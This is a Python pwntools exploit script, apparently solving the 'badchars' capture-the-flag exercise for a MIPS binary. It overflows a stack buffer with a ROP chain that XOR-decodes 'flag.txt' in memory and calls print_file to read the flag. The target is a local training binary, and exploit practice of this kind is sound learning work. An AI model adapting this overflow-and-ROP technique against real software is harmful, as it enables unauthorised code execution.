from pwn import *

data = 0x00411000 # rw-
print_file = 0x00400ab0 # plt
lw_sw = 0x00400930 # lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; sw $t1, ($t0) ; jalr $t9
xor = 0x00400948 # lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; lw $t2, ($t1) ; xor $t0, $t0, $t2 ; sw $t0, ($t1) ; jalr $t9
lw_a0 = 0x00400968 # lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9
key = 0x2
flag = bytes([ i^key for i in b"flag.txt" ])

#print(flag)

# Writing encoded filename
payload = b"".join([
    b"A"*(32+4),
    p32(lw_sw),
    b"B"*4,
    flag[:4],
    p32(data),
    p32(lw_sw),
    b"C"*4,
    flag[4:],
    p32(data+4),
    p32(xor),
])

# Decoding filename
for i in range(0, 8, 2):
    payload += b"".join([
        b"D"*4,
        p32(data),
        p32(key*pow(0x10, i)),
        p32(xor)
    ])
for i in range(0, 6, 2):
    payload += b"".join([
        b"D"*4,
        p32(data+4),
        p32(key*pow(0x10, i)),
        p32(xor)
    ])
payload += b"".join([
    b"D"*4,
    p32(data+4),
    p32(key*pow(0x10, 6)),
])

# Calling print_file
payload += b"".join([
    p32(lw_a0),
    b"E"*4,
    p32(print_file),
    p32(data),
])

#p = process(["qemu-mipsel", "-g", "1234", "badchars_mipsel"])
p = process("./badchars_mipsel")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"you!\n")
flag = p.recv()
print(f"Flag : {flag}")
